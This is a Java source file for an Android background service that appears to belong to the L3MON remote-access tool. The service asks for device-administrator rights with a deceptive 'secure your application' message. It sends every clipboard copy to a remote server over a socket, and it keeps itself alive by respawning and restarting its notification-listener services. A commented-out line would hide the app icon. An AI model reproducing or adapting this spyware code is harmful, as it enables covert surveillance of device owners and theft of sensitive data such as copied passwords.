package com.etechd.l3mon;

import android.app.ActivityManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.lang.reflect.Method;
import java.util.List;

public class MainService extends Service {
    private static final String MAIN_SERVICE = "MAIN_SERVICE";
    private static Context contextOfApplication = null;
    public static ComponentName mAdminName;
    public static DevicePolicyManager mDPM;

    public MainService() {

    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        //throw new UnsupportedOperationException("Not yet implemented");
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        Log.i(MAIN_SERVICE, "Main service onCreate().");

        isNotificationMonitorService();
    }

    @Override
    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
        PackageManager packageManager = this.getPackageManager();
        mDPM = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        try {
            mAdminName = new ComponentName(this, Class.forName("com.etechd.l3mon.DeviceAdmin"));
            if (!mDPM.isAdminActive(mAdminName)) {
                Intent intent2 = new Intent("android.app.action.ADD_DEVICE_ADMIN");
                intent2.putExtra("android.app.extra.DEVICE_ADMIN", mAdminName);
                intent2.putExtra("android.app.extra.ADD_EXPLANATION", "Click on Activate button to secure your application.");
                startActivity(intent2);
            }
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }

        // Hide App Icon
        //packageManager.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        ClipboardManager.OnPrimaryClipChangedListener mPrimaryChangeListener = new ClipboardManager.OnPrimaryClipChangedListener() {
            public void onPrimaryClipChanged() {
                ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                if (clipboard.hasPrimaryClip()) {
                    ClipData clipData = clipboard.getPrimaryClip();
                    if (clipData.getItemCount() > 0) {
                        CharSequence text = clipData.getItemAt(0).getText();
                        if (text != null) {
                            try {
                                JSONObject data = new JSONObject();
                                data.put("text", text);
                                IOSocket.getInstance().getIoSocket().emit("0xCB", data);
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }
            }
        };

        ClipboardManager clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        clipboardManager.addPrimaryClipChangedListener(mPrimaryChangeListener);

        contextOfApplication = this;
        ConnectionManager.startAsync(this);
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        sendBroadcast(new Intent("respawnService"));
    }

    public static Context getContextOfApplication() {
        if (null != contextOfApplication) {
            return contextOfApplication;
        } else {
            try {
                return (Context) Class.forName("android.app.ActivityThread").getMethod("currentApplication").invoke(null, (Object[]) null);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return null;
    }

    // 检查通知监视服务是否失效，如果失效，则重新启动
    private void isNotificationMonitorService() {
        ComponentName Notification_componentName = new ComponentName(this, NotificationListener.class);
        ComponentName ForegroundService_componentName = new ComponentName(this, ForegroundService.class);
        ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        boolean isNotificationRunning = false;
        boolean isForegroundRunning = false;
        List<ActivityManager.RunningServiceInfo> runningServiceInfo = activityManager.getRunningServices(Integer.MAX_VALUE);
        if (runningServiceInfo == null) {
            // 状态没获取到，则暴力启动
            startService(new Intent(this, ForegroundService.class));
            return;
        }

        for (ActivityManager.RunningServiceInfo service : runningServiceInfo) {
            if (service.service.equals(Notification_componentName)) {
                isNotificationRunning = true;
            }
            if (service.service.equals(ForegroundService_componentName)) {
                isForegroundRunning = true;
            }
        }

        if (!isNotificationRunning) {
            restartNotificationMonitorService();
        }
        if (!isForegroundRunning) {
            startService(new Intent(this, ForegroundService.class));
        }
    }

    // 重新启动通知栏获取
    private void restartNotificationMonitorService() {
        ComponentName componentName = new ComponentName(this, NotificationListener.class);
        PackageManager packageManager = getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void findContext() throws Exception {
        try {
            final Method method = Class.forName("android.app.ActivityThread").getMethod("currentApplication", new Class[0]);
            Context context = (Context) method.invoke(null, null);
            if (context == null) {
                new Handler(Looper.getMainLooper()).post(new Runnable() {
                    public void run() {
                        try {
                            Context context = (Context) method.invoke(null, null);
                            if (context != null) {
                                MainService.startService(context);
                            }
                        } catch (Exception e) {
                        }
                    }
                });
            } else {
                startService(context);
            }
        } catch (ClassNotFoundException e) {
        }
    }

    public static void start() {
        try {
            findContext();
            Log.e(MAIN_SERVICE, "Main service start().");
        } catch (Exception e) {
        }
    }

    public static void startService(Context context) {
        try {
            Log.e(MAIN_SERVICE, "Main service startService().");
            context.startService(new Intent(context, MainService.class));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
